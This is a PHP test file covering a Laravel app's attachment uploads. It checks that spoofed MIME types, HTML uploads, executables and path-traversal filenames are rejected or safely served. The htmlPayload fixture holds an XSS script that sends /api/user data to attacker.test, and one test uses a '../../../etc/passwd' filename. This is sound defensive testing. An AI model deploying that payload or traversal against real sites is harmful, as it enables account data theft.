<?php

declare(strict_types=1);

use App\Enums\MaintenanceStatus;
use App\Models\Asset;
use App\Models\AssetAttachment;
use App\Models\Attachment;
use App\Models\RepairImage;
use App\Support\Attachments\AttachmentSecurity;
use Database\Seeders\MaintenanceTypeSeeder;
use Database\Seeders\TicketLookupSeeder;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;

/**
 * Regression cover for the stored-XSS / spoofed-MIME vulnerability that affected
 * **both** attachment surfaces (SDD DD-45).
 *
 * The original defect: `getClientMimeType()` — a value the uploader sets and
 * nothing validates — was persisted as `mime_type` and then echoed back as the
 * response `Content-Type`, inline, with no `nosniff` and no CSP. A permitted
 * upload could therefore be re-served as `text/html` and execute in the app's
 * own origin.
 *
 * These tests assert the property rather than the patch: **no request-supplied
 * value may influence the type that is stored or served.** They run against
 * Assets, Tickets **and Maintenance** from one file on purpose — the modules
 * must never be allowed to drift apart again, and WP-2.6 adding a third profile
 * (SDD DD-53) is exactly the moment that risk returns.
 */
beforeEach(function () {
    seedRbac();
    $this->seed(TicketLookupSeeder::class);
    $this->seed(MaintenanceTypeSeeder::class);
    Storage::fake('local');
});

/**
 * Build an upload whose *declared* type differs from its real content — the
 * attacker's primitive. Laravel's UploadedFile takes the client MIME as a
 * constructor argument, exactly as a crafted multipart part would supply it.
 */
function spoofedUpload(string $filename, string $content, string $declaredMime): UploadedFile
{
    $path = tempnam(sys_get_temp_dir(), 'atk');
    file_put_contents($path, $content);

    return new UploadedFile($path, $filename, $declaredMime, null, true);
}

/**
 * A real, minimal PNG — 1x1, valid magic bytes, detected as image/png.
 *
 * Written by us rather than wrapping `UploadedFile::fake()->image()`: that
 * helper's temp file is consumed by the request and is gone by the time the
 * MIME guesser reads it, which fails as a missing file rather than as a
 * meaningful assertion.
 */
function pngBytes(): string
{
    return (string) base64_decode(
        'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='
    );
}

/**
 * A payload that genuinely passes validation: real plain text, no markup.
 *
 * This is the attacker's actual foothold. {@see htmlPayload()} never reaches
 * storage at all — finfo detects markup as `text/html`, which no profile
 * allows — so the interesting question is what happens to a *permitted* file
 * that was merely declared as something dangerous.
 */
function logPayload(): string
{
    return '2026-08-28 03:00:01 ERROR disk read failure on /dev/sda1
'
        .'2026-08-28 03:00:02 WARN  retrying sector 41822
';
}

/** Bytes that a browser would execute as a document. */
function htmlPayload(): string
{
    return '<html><body><script>fetch("/api/user").then(r=>r.json())'
        .'.then(d=>fetch("//attacker.test/?"+btoa(JSON.stringify(d))))</script></body></html>';
}

/* ─────────────────────────────── Tickets ─────────────────────────────── */

it('refuses to store a client-supplied MIME type on a ticket attachment', function () {
    $reporter = userWithRole('teacher');
    $ticket = ticketFor($reporter);

    $this->actingAs($reporter)->post(
        "/api/tickets/{$ticket->uuid}/attachments",
        ['file' => spoofedUpload('notes.txt', logPayload(), 'text/html')],
        ['Accept' => 'application/json'],
    )->assertCreated();

    $attachment = Attachment::query()->firstOrFail();

    // Detected from the bytes, not taken from the request.
    expect($attachment->mime_type)->toBe('text/plain')
        ->and($attachment->mime_type)->not->toBe('text/html');
});

it('never serves a ticket attachment as the type the uploader declared', function () {
    $reporter = userWithRole('teacher');
    $ticket = ticketFor($reporter);

    $this->actingAs($reporter)->post(
        "/api/tickets/{$ticket->uuid}/attachments",
        ['file' => spoofedUpload('payload.txt', logPayload(), 'text/html')],
        ['Accept' => 'application/json'],
    )->assertCreated();

    $attachment = Attachment::query()->firstOrFail();

    $response = $this->actingAs($reporter)
        ->get("/api/tickets/attachments/{$attachment->uuid}")
        ->assertOk();

    // This is the attack, and every line below is one of the reasons it fails.
    expect($response->headers->get('Content-Type'))->not->toContain('text/html');
    expect($response->headers->get('Content-Type'))->toContain('text/plain');
    expect($response->headers->get('X-Content-Type-Options'))->toBe('nosniff');
    expect($response->headers->get('Content-Disposition'))->toStartWith('attachment');
    expect($response->headers->get('Content-Security-Policy'))->toContain("default-src 'none'");
});

it('neutralises a ticket attachment row poisoned before the fix existed', function () {
    $reporter = userWithRole('teacher');
    $ticket = ticketFor($reporter);

    $this->actingAs($reporter)->post(
        "/api/tickets/{$ticket->uuid}/attachments",
        ['file' => spoofedUpload('legacy.txt', logPayload(), 'text/plain')],
        ['Accept' => 'application/json'],
    )->assertCreated();

    $attachment = Attachment::query()->firstOrFail();

    // Simulate a row written by the vulnerable code: the DB itself is poisoned,
    // which no upload-side fix can undo. The serve path must still be safe.
    $attachment->forceFill(['mime_type' => 'text/html'])->save();

    $response = $this->actingAs($reporter)
        ->get("/api/tickets/attachments/{$attachment->uuid}")
        ->assertOk();

    expect($response->headers->get('Content-Type'))->not->toContain('text/html');
    expect($response->headers->get('Content-Type'))->toContain('application/octet-stream');
    expect($response->headers->get('Content-Disposition'))->toStartWith('attachment');
});

it('hides a poisoned MIME type from the ticket attachment listing', function () {
    $reporter = userWithRole('teacher');
    $ticket = ticketFor($reporter);

    $this->actingAs($reporter)->post(
        "/api/tickets/{$ticket->uuid}/attachments",
        ['file' => spoofedUpload('legacy.txt', 'plain text', 'text/plain')],
        ['Accept' => 'application/json'],
    )->assertCreated();

    Attachment::query()->firstOrFail()->forceFill(['mime_type' => 'text/html'])->save();

    $response = $this->actingAs($reporter)
        ->getJson("/api/tickets/{$ticket->uuid}/attachments")
        ->assertOk();

    expect($response->json('data.0.mime_type'))->toBeNull()
        ->and($response->json('data.0.is_image'))->toBeFalse();
});

it('still serves a genuine ticket image inline so previews keep working', function () {
    $reporter = userWithRole('teacher');
    $ticket = ticketFor($reporter);

    $this->actingAs($reporter)->post(
        "/api/tickets/{$ticket->uuid}/attachments",
        ['file' => UploadedFile::fake()->image('fault.png')],
        ['Accept' => 'application/json'],
    )->assertCreated();

    $attachment = Attachment::query()->firstOrFail();

    $response = $this->actingAs($reporter)
        ->get("/api/tickets/attachments/{$attachment->uuid}")
        ->assertOk();

    expect($response->headers->get('Content-Type'))->toContain('image/png')
        ->and($response->headers->get('Content-Disposition'))->toStartWith('inline')
        ->and($response->headers->get('X-Content-Type-Options'))->toBe('nosniff');
});

it('forces a ticket PDF to download rather than render in the app origin', function () {
    $reporter = userWithRole('teacher');
    $ticket = ticketFor($reporter);

    $this->actingAs($reporter)->post(
        "/api/tickets/{$ticket->uuid}/attachments",
        ['file' => spoofedUpload('report.pdf', "%PDF-1.4\n1 0 obj\n<<>>\nendobj\ntrailer\n%%EOF\n", 'application/pdf')],
        ['Accept' => 'application/json'],
    )->assertCreated();

    $attachment = Attachment::query()->firstOrFail();

    $response = $this->actingAs($reporter)
        ->get("/api/tickets/attachments/{$attachment->uuid}")
        ->assertOk();

    // A PDF is a scripting format; rendering one inline runs it in this origin.
    expect($response->headers->get('Content-Disposition'))->toStartWith('attachment');
});

it('rejects a ticket upload whose bytes are HTML, however it is declared', function () {
    $reporter = userWithRole('teacher');
    $ticket = ticketFor($reporter);

    // The audit's exact payload. Detection reads the markup and returns
    // text/html, which no profile permits — so the polyglot never reaches
    // storage, let alone a response. Declaring it text/plain changes nothing,
    // because the declaration is not consulted.
    foreach (['text/plain', 'text/html', 'image/png'] as $declared) {
        $this->actingAs($reporter)->post(
            "/api/tickets/{$ticket->uuid}/attachments",
            ['file' => spoofedUpload('evil.txt', htmlPayload(), $declared)],
            ['Accept' => 'application/json'],
        )->assertStatus(422);
    }

    expect(Attachment::query()->count())->toBe(0);
});

it('rejects a ticket upload whose real content is outside the allow-list', function () {
    $reporter = userWithRole('teacher');
    $ticket = ticketFor($reporter);

    // Real content is a Windows executable; the name and declared type both lie.
    $this->actingAs($reporter)->post(
        "/api/tickets/{$ticket->uuid}/attachments",
        ['file' => spoofedUpload('harmless.png', "MZ\x90\x00\x03".str_repeat("\x00", 128), 'image/png')],
        ['Accept' => 'application/json'],
    )->assertStatus(422);

    expect(Attachment::query()->count())->toBe(0);
});

/* ─────────────────────────────── Assets ──────────────────────────────── */

it('refuses to store a client-supplied MIME type on an asset attachment', function () {
    $admin = userWithRole('administrator');
    $asset = Asset::factory()->create();

    $this->actingAs($admin)->post(
        "/api/admin/assets/{$asset->uuid}/attachments",
        ['file' => spoofedUpload('front.png', 'x', 'text/html')],
        ['Accept' => 'application/json'],
    )->assertStatus(422);

    // A genuine image, but declared as something else, still stores the truth.
    $this->actingAs($admin)->post(
        "/api/admin/assets/{$asset->uuid}/attachments",
        ['file' => spoofedUpload('front.png', pngBytes(), 'text/html')],
        ['Accept' => 'application/json'],
    )->assertCreated();

    $attachment = AssetAttachment::query()->firstOrFail();

    expect($attachment->mime_type)->toBe('image/png')
        ->and($attachment->kind)->toBe(AttachmentSecurity::KIND_IMAGE);
});

it('never serves an asset attachment as the type the uploader declared', function () {
    $admin = userWithRole('administrator');
    $asset = Asset::factory()->create();

    $this->actingAs($admin)->post(
        "/api/admin/assets/{$asset->uuid}/attachments",
        ['file' => spoofedUpload('evidence.png', pngBytes(), 'text/html')],
        ['Accept' => 'application/json'],
    )->assertCreated();

    $attachment = AssetAttachment::query()->firstOrFail();

    $response = $this->actingAs($admin)
        ->get("/api/admin/asset-attachments/{$attachment->uuid}")
        ->assertOk();

    expect($response->headers->get('Content-Type'))->not->toContain('text/html');
    expect($response->headers->get('Content-Type'))->toContain('image/png');
    expect($response->headers->get('X-Content-Type-Options'))->toBe('nosniff');
    expect($response->headers->get('Content-Security-Policy'))->toContain("default-src 'none'");
});

it('neutralises an asset attachment row poisoned before the fix existed', function () {
    $admin = userWithRole('administrator');
    $asset = Asset::factory()->create();

    $this->actingAs($admin)->post(
        "/api/admin/assets/{$asset->uuid}/attachments",
        ['file' => UploadedFile::fake()->image('legacy.png')],
        ['Accept' => 'application/json'],
    )->assertCreated();

    $attachment = AssetAttachment::query()->firstOrFail();
    $attachment->forceFill(['mime_type' => 'text/html'])->save();

    $response = $this->actingAs($admin)
        ->get("/api/admin/asset-attachments/{$attachment->uuid}")
        ->assertOk();

    expect($response->headers->get('Content-Type'))->toContain('application/octet-stream')
        ->and($response->headers->get('Content-Disposition'))->toStartWith('attachment');
});

/* ──────────────────── The boundary itself, in isolation ──────────────── */

it('keeps every module on one allow-list', function () {
    // Tickets accept everything Assets do, and Maintenance is the asset list
    // exactly. If a type is ever added to one profile alone, that is a decision
    // someone must make deliberately here rather than discover later as a
    // difference in behaviour between two upload surfaces.
    $asset = AttachmentSecurity::allowedMimes(AttachmentSecurity::PROFILE_ASSET);
    $ticket = AttachmentSecurity::allowedMimes(AttachmentSecurity::PROFILE_TICKET);
    $maintenance = AttachmentSecurity::allowedMimes(AttachmentSecurity::PROFILE_MAINTENANCE);

    expect(array_diff($asset, $ticket))->toBe([])
        ->and(array_diff($maintenance, $ticket))->toBe([]);

    // Repair evidence is photographs of hardware, so the maintenance profile is
    // deliberately narrower than the ticket one: no pasted log text (DD-53).
    expect($maintenance)->not->toContain('text/plain');

    // No profile may ever permit an executable document type.
    foreach ([$asset, $ticket, $maintenance] as $list) {
        expect($list)->not->toContain('text/html')
            ->and($list)->not->toContain('image/svg+xml')
            ->and($list)->not->toContain('application/xhtml+xml');
    }
});

it('refuses to classify or serve a type outside the profile', function () {
    expect(AttachmentSecurity::isAllowed('text/html', AttachmentSecurity::PROFILE_TICKET))->toBeFalse()
        ->and(AttachmentSecurity::isAllowed('text/plain', AttachmentSecurity::PROFILE_TICKET))->toBeTrue()
        // text/plain is a ticket type only — assets never accepted it.
        ->and(AttachmentSecurity::isAllowed('text/plain', AttachmentSecurity::PROFILE_ASSET))->toBeFalse()
        ->and(AttachmentSecurity::isAllowed(null, AttachmentSecurity::PROFILE_ASSET))->toBeFalse();
});

/* ──────────────────────────── Maintenance ────────────────────────────── */

/**
 * Repair evidence joined this boundary in WP-2.6 (SDD DD-53, SRS DR-021). Every
 * assertion below is the maintenance restatement of one already made above for
 * tickets and assets — which is the point: a third upload path would have had
 * to earn each of these separately, and would eventually have failed one.
 */

/** An open maintenance record owned by a technician entitled to attach to it. */
function evidenceFixture(): array
{
    $technician = userWithRole('technician');
    $record = maintenanceFor($technician, 'corrective', [
        'status' => MaintenanceStatus::InProgress->value,
    ]);

    return [$technician, $record];
}

it('refuses to store a client-supplied MIME type on repair evidence', function () {
    [$technician, $record] = evidenceFixture();

    $this->actingAs($technician)->post(
        "/api/maintenance/{$record->uuid}/evidence",
        ['file' => spoofedUpload('before.png', pngBytes(), 'text/html'), 'image_type' => 'before'],
        ['Accept' => 'application/json'],
    )->assertCreated();

    $image = RepairImage::query()->firstOrFail();

    // Detected from the bytes, not taken from the request.
    expect($image->mime_type)->toBe('image/png')
        ->and($image->mime_type)->not->toBe('text/html')
        // DR-021's four columns are what make this recordable at all.
        ->and($image->checksum)->toBe(hash('sha256', pngBytes()))
        ->and($image->file_size)->toBe(strlen(pngBytes()))
        ->and($image->original_filename)->toBe('before.png');
});

it('rejects an evidence upload whose detected type is outside the maintenance profile', function () {
    [$technician, $record] = evidenceFixture();

    // A real text file declared as an image. The ticket profile would take the
    // bytes; the narrower maintenance profile must not.
    $this->actingAs($technician)->post(
        "/api/maintenance/{$record->uuid}/evidence",
        ['file' => spoofedUpload('log.txt', logPayload(), 'image/png'), 'image_type' => 'before'],
        ['Accept' => 'application/json'],
    )->assertStatus(422);

    expect(RepairImage::query()->count())->toBe(0);
});

it('rejects markup uploaded as repair evidence', function () {
    [$technician, $record] = evidenceFixture();

    $this->actingAs($technician)->post(
        "/api/maintenance/{$record->uuid}/evidence",
        ['file' => spoofedUpload('after.png', htmlPayload(), 'image/png'), 'image_type' => 'after'],
        ['Accept' => 'application/json'],
    )->assertStatus(422);

    expect(RepairImage::query()->count())->toBe(0);
});

it('never composes an evidence storage path from the uploaded filename', function () {
    [$technician, $record] = evidenceFixture();

    $this->actingAs($technician)->post(
        "/api/maintenance/{$record->uuid}/evidence",
        ['file' => spoofedUpload('../../../etc/passwd.png', pngBytes(), 'image/png'), 'image_type' => 'during'],
        ['Accept' => 'application/json'],
    )->assertCreated();

    $image = RepairImage::query()->firstOrFail();

    // The stored name is the server's; the client's is kept only as data.
    expect($image->storage_path)->toStartWith("maintenance/{$record->uuid}/")
        ->and($image->storage_path)->not->toContain('..')
        ->and($image->storage_path)->not->toContain('passwd');
});

it('serves repair evidence with server-decided headers', function () {
    [$technician, $record] = evidenceFixture();

    $id = $this->actingAs($technician)->post(
        "/api/maintenance/{$record->uuid}/evidence",
        ['file' => spoofedUpload('before.png', pngBytes(), 'text/html'), 'image_type' => 'before'],
        ['Accept' => 'application/json'],
    )->assertCreated()->json('data.id');

    $response = $this->actingAs($technician)
        ->get("/api/maintenance/{$record->uuid}/evidence/{$id}")
        ->assertOk();

    expect($response->headers->get('Content-Type'))->toContain('image/png')
        ->and($response->headers->get('X-Content-Type-Options'))->toBe('nosniff')
        ->and($response->headers->get('Content-Security-Policy'))->toContain("default-src 'none'")
        ->and($response->headers->get('Content-Security-Policy'))->toContain('sandbox');
});

it('degrades a poisoned evidence row to an opaque download', function () {
    [$technician, $record] = evidenceFixture();

    $id = $this->actingAs($technician)->post(
        "/api/maintenance/{$record->uuid}/evidence",
        ['file' => spoofedUpload('before.png', pngBytes(), 'image/png'), 'image_type' => 'before'],
        ['Accept' => 'application/json'],
    )->assertCreated()->json('data.id');

    // A row as it would have been written before this boundary existed. The
    // re-check at serve time neutralises it, with no data migration.
    RepairImage::query()->firstOrFail()->forceFill(['mime_type' => 'text/html'])->save();

    $response = $this->actingAs($technician)
        ->get("/api/maintenance/{$record->uuid}/evidence/{$id}")
        ->assertOk();

    expect($response->headers->get('Content-Type'))->toContain('application/octet-stream')
        ->and($response->headers->get('Content-Disposition'))->toStartWith('attachment');
});

it('forces a PDF evidence document to download rather than render in this origin', function () {
    [$technician, $record] = evidenceFixture();

    $pdf = "%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n";

    $id = $this->actingAs($technician)->post(
        "/api/maintenance/{$record->uuid}/evidence",
        ['file' => spoofedUpload('service.pdf', $pdf, 'application/pdf'), 'image_type' => 'after'],
        ['Accept' => 'application/json'],
    )->assertCreated()->json('data.id');

    $response = $this->actingAs($technician)
        ->get("/api/maintenance/{$record->uuid}/evidence/{$id}")
        ->assertOk();

    // A PDF is a scripting format and an inline viewer runs in this origin.
    expect($response->headers->get('Content-Disposition'))->toStartWith('attachment');
});

it('refuses to serve evidence to a technician who does not own the record', function () {
    [$technician, $record] = evidenceFixture();
    $stranger = userWithRole('technician');

    $id = $this->actingAs($technician)->post(
        "/api/maintenance/{$record->uuid}/evidence",
        ['file' => spoofedUpload('before.png', pngBytes(), 'image/png'), 'image_type' => 'before'],
        ['Accept' => 'application/json'],
    )->assertCreated()->json('data.id');

    // The download re-checks the owning record's policy on every request.
    $this->actingAs($stranger)
        ->get("/api/maintenance/{$record->uuid}/evidence/{$id}")
        ->assertForbidden();
});

it('404s an evidence identifier that belongs to a different record', function () {
    [$technician, $record] = evidenceFixture();
    $other = maintenanceFor($technician, 'corrective', [
        'status' => MaintenanceStatus::InProgress->value,
    ]);

    $id = $this->actingAs($technician)->post(
        "/api/maintenance/{$record->uuid}/evidence",
        ['file' => spoofedUpload('before.png', pngBytes(), 'image/png'), 'image_type' => 'before'],
        ['Accept' => 'application/json'],
    )->assertCreated()->json('data.id');

    // Nested addressing: the image must belong to the record named in the path.
    $this->actingAs($technician)
        ->get("/api/maintenance/{$other->uuid}/evidence/{$id}")
        ->assertNotFound();
});
